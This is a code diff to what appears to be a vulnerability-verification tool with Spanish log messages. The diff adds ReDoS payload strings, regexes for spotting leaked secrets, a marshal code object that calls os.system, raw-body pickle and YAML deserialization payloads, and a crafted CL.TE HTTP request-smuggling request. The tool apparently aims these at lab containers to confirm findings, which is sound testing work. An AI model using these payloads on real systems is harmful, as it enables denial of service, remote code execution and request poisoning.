@@ -10608,11 +10608,18 @@ def verify_generic_redos(
     lab, base_url, container = boot
     try:
         m = (http_method or "POST").upper()
-        # Default ReDoS payload: evil regex trigger for (a+)+ / (a|aa)+ patterns
-        _evil = redos_payload or ("a" * 30 + "!")
-        _safe = "hello"
+        # Diverse ReDoS payloads targeting common vulnerable regex patterns
+        _REDOS_PAYLOADS = [
+            redos_payload or ("a" * 30 + "!"),           # generic (a+)+ trigger
+            "a" * 25 + "@" + "a" * 25 + ".c",           # email regex (.*@.* style)
+            "a" * 20 + "a" * 20 + "!",                  # (a|aa)+ backtracking
+            "http://" + "a" * 30 + "!" + "/path",        # URL regex
+            "1" * 30 + "!",                              # numeric repetition
+            "(" * 15 + "a" + ")" * 15 + "!" * 5,        # nested group trigger
+            "A" * 20 + "!" + "a" * 10,                  # mixed case + non-match
+        ]
+        _safe = "hello@example.com"
         url = base_url + (endpoint or "/")
-        step(f"probando ReDoS: enviando input benigno ({len(_safe)} chars) a {endpoint}")
 
         def _timed_request(payload: str) -> tuple:
             t0 = _time.monotonic()
@@ -10629,18 +10636,31 @@ def verify_generic_redos(
                 elapsed = _time.monotonic() - t0
                 return elapsed, 0, "", str(exc)
 
+        step(f"probando ReDoS: midiendo baseline con input benigno a {endpoint}")
         t_safe, _st_s, _body_s, _err_s = _timed_request(_safe)
-        step(f"input benigno: {t_safe:.2f}s (status={_st_s})")
+        step(f"baseline benigno: {t_safe:.2f}s (status={_st_s})")
 
-        step(f"probando ReDoS: enviando payload malicioso ({len(_evil)} chars)")
-        t_evil, _st_e, _body_e, _err_e = _timed_request(_evil)
-        step(f"input malicioso: {t_evil:.2f}s (status={_st_e})")
+        _best_ratio = 0.0
+        _best_t_evil = 0.0
+        _best_payload = ""
+        for _evil in _REDOS_PAYLOADS:
+            step(f"probando payload ReDoS ({len(_evil)} chars): {_evil[:30]}…")
+            t_evil, _st_e, _body_e, _err_e = _timed_request(_evil)
+            ratio = t_evil / t_safe if t_safe > 0.01 else t_evil / 0.05
+            step(f"  → {t_evil:.2f}s (ratio={ratio:.1f}x)")
+            if ratio > _best_ratio:
+                _best_ratio, _best_t_evil, _best_payload = ratio, t_evil, _evil
+            if t_evil > 1.5 and ratio >= 5:
+                break  # confirmed — stop early
 
-        ratio = t_evil / t_safe if t_safe > 0.01 else t_evil / 0.05
+        ratio = _best_ratio
+        t_evil = _best_t_evil
+        _evil = _best_payload
         res.evidence.update({
             "endpoint": endpoint, "param": inject_param,
             "t_safe": round(t_safe, 3), "t_evil": round(t_evil, 3),
             "ratio": round(ratio, 1), "payload": _evil,
+            "payloads_tried": len(_REDOS_PAYLOADS),
         })
 
         if t_evil > 1.5 and ratio >= 5:
@@ -10659,7 +10679,7 @@ def verify_generic_redos(
         else:
             res.ok = True
             res.detail = (f"ReDoS no detectado: ratio={ratio:.1f}x, t_evil={t_evil:.2f}s — "
-                          f"no hay diferencial de tiempo significativo entre input benigno y malicioso")
+                          f"no hay diferencial de tiempo significativo ({len(_REDOS_PAYLOADS)} payloads probados)")
         return res
     except Exception as e:
         res.detail = f"error inesperado en verify_generic_redos: {e}"
@@ -10757,6 +10777,19 @@ def verify_generic_information_disclosure(
                 r'db_pass|private_key|access_key|aws_secret|binoracle_secret|'
                 r'binoracle_db_url|app_secret)',
                 re.I)
+            # High-confidence secret patterns — if matched, verify=True immediately
+            _SECRET_REGEXES = [
+                # AWS access key
+                re.compile(r'(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])'),
+                # AWS secret key
+                re.compile(r'[A-Za-z0-9/+]{40}'),
+                # Private key PEM header
+                re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----'),
+                # JWT (3-part base64url)
+                re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'),
+                # Generic bearer token in env-style
+                re.compile(r'(?i)(?:secret|token|key|password)\s*[=:]\s*["\']?[A-Za-z0-9/+_\-]{16,}'),
+            ]
 
             _probe_endpoints = ([endpoint] if endpoint else []) + _DISCLOSURE_PATHS
 
@@ -10791,6 +10824,24 @@ def verify_generic_information_disclosure(
                         "respuesta_cuerpo_recorte": body[:400],
                     })
                     step(f"VERIFICADO — confirm_string '{confirm_string[:30]}' en {_ep}")
+                    return res
+                # High-confidence secret pattern → verify immediately
+                _hc_match = None
+                for _sr in _SECRET_REGEXES:
+                    _hc_match = _sr.search(body)
+                    if _hc_match:
+                        break
+                if _hc_match and len(body) < 100000:
+                    res.verified = True
+                    res.ok = True
+                    res.evidence.update({
+                        "disclosure_path": _ep,
+                        "status_code": r.status_code,
+                        "secret_pattern_matched": _hc_match.re.pattern[:60],
+                        "secret_snippet": body[max(0, _hc_match.start() - 20):_hc_match.start() + 60],
+                        "respuesta_cuerpo_recorte": body[:400],
+                    })
+                    step(f"VERIFICADO — secret regex match en {_ep}: pattern={_hc_match.re.pattern[:40]}")
                     return res
                 # Non-canary but suspicious content — record but don't verify
                 if _sensitive_patterns.search(body) and len(body) < 50000:
@@ -10872,12 +10923,31 @@ def verify_generic_python_deserialization(
         f"- 'echo {_canary_tok} > {_canary_path}'\n"
     )
 
+    # marshal RCE: compile a code object that writes canary
+    _marshal_payload = b""
+    try:
+        import marshal as _marshal
+        _code_src = (
+            f"import os\n"
+            f"os.system('echo {_canary_tok} > {_canary_path}')\n"
+        )
+        _co = compile(_code_src, "<marshal>", "exec")
+        _marshal_payload = _marshal.dumps(_co)
+    except Exception:
+        pass
+
     _payloads = [
-        ("pickle-raw",    _raw_pickle,                   content_type),
-        ("pickle-base64", _b64_pickle.encode(),          "text/plain"),
-        ("pickle-hex",    _hex_pickle.encode(),           "text/plain"),
-        ("yaml-unsafe",   _yaml_payload.encode(),         "application/yaml"),
-    ]
+        ("pickle-raw",          _raw_pickle,                        content_type),
+        ("pickle-base64",       _b64_pickle.encode(),               "text/plain"),
+        ("pickle-hex",          _hex_pickle.encode(),               "text/plain"),
+        ("yaml-unsafe",         _yaml_payload.encode(),             "application/yaml"),
+        # Raw body variants — many endpoints read request.body directly
+        ("pickle-raw-body",     _raw_pickle,                        "application/octet-stream"),
+        ("pickle-b64-body",     _b64_pickle.encode(),               "application/x-www-form-urlencoded"),
+    ] + (
+        [("marshal-raw", _marshal_payload, "application/octet-stream")]
+        if _marshal_payload else []
+    )
 
     lab = None
     try:
@@ -10892,9 +10962,14 @@ def verify_generic_python_deserialization(
                 step(f"probando deserialización {_pl_name} → {endpoint}...")
                 try:
                     headers = {"Content-Type": _pl_ct}
+                    _raw_body_mode = "body" in _pl_name or "marshal" in _pl_name
                     if http_method.upper() == "GET":
                         r = _rq.get(boot.base_url + endpoint,
                                     params={inject_param: _pl_data}, timeout=15)
+                    elif _raw_body_mode:
+                        # Send payload as raw request body, not form-encoded
+                        r = _rq.request(http_method.upper(), boot.base_url + endpoint,
+                                        headers=headers, data=_pl_data, timeout=15)
                     else:
                         r = _rq.request(http_method.upper(), boot.base_url + endpoint,
                                         headers=headers, data={inject_param: _pl_data},
@@ -11901,11 +11976,65 @@ def verify_generic_http_request_smuggling(
                      f"ratio={max(_ratio_clte, _ratio_tecl):.1f}x over baseline")
                 return res
 
+            # --- Differential response probe (CL.TE variant) ---
+            # Poison the backend pipe with a partial request prefix, then send a normal request.
+            # If the second response body starts with the smuggled prefix → confirmed.
+            step("probando differential-response smuggling (CL.TE)...")
+            _smug_marker = "BINORACLE-SMUG-X"
+            # Attack request: CL=4 so front-end reads only "1\r\n" as body
+            # but back-end reads chunked and sees "G" leftover → prefix for next request
+            _diff_attack = (
+                f"POST {endpoint} HTTP/1.1\r\n"
+                f"Host: {_host}:{_port}\r\n"
+                f"Content-Length: {len(_smug_marker) + 100}\r\n"
+                f"Transfer-Encoding: chunked\r\n"
+                f"\r\n"
+                f"0\r\n"
+                f"\r\n"
+                f"GET /binoracle_smug_probe HTTP/1.1\r\n"
+                f"X-Smuggled: {_smug_marker}\r\n"
+                f"\r\n"
+            )
+            _diff_response = ""
+            try:
+                s3 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+                s3.settimeout(8)
+                s3.connect((_host, _port))
+                s3.sendall(_diff_attack.encode())
+                _t0_diff = _t.time()
+                _buf = b""
+                while _t.time() - _t0_diff < 7:
+                    try:
+                        _chunk = s3.recv(2048)
+                        if not _chunk:
+                            break
+                        _buf += _chunk
+                        if len(_buf) > 8192:
+                            break
+                    except _sock.timeout:
+                        break
+                s3.close()
+                _diff_response = _buf.decode("utf-8", errors="replace")
+            except Exception as _de:
+                step(f"  differential probe error: {_de}")
+
+            if _smug_marker in _diff_response or "/binoracle_smug_probe" in _diff_response:
+                res.verified = True
+                res.ok = True
+                res.evidence.update({
+                    "smuggling_type": "CL.TE-differential",
+                    "smuggled_marker_found": True,
+                    "response_snippet": _diff_response[:300],
+                })
+                step(f"VERIFICADO — HTTP Request Smuggling (CL.TE differential): "
+                     f"marker '{_smug_marker}' found in poisoned response")
+                return res
+
             res.ok = True
             res.detail = (f"http-request-smuggling: CL.TE ratio={_ratio_clte:.1f}x, "
-                          f"TE.CL ratio={_ratio_tecl:.1f}x — no timeout diferencial "
-                          f"(necesita >=8x sobre baseline de {_baseline_ms:.0f}ms)")
-            step("http-request-smuggling: no verificado — sin timing diferencial")
+                          f"TE.CL ratio={_ratio_tecl:.1f}x, differential response negative — "
+                          f"no confirmado (necesita >=8x sobre baseline de {_baseline_ms:.0f}ms)")
+            step("http-request-smuggling: no verificado — sin timing ni differential diferencial")
             return res
     except Exception as e:
         res.detail = f"error inesperado en verify_generic_http_request_smuggling: {e}"
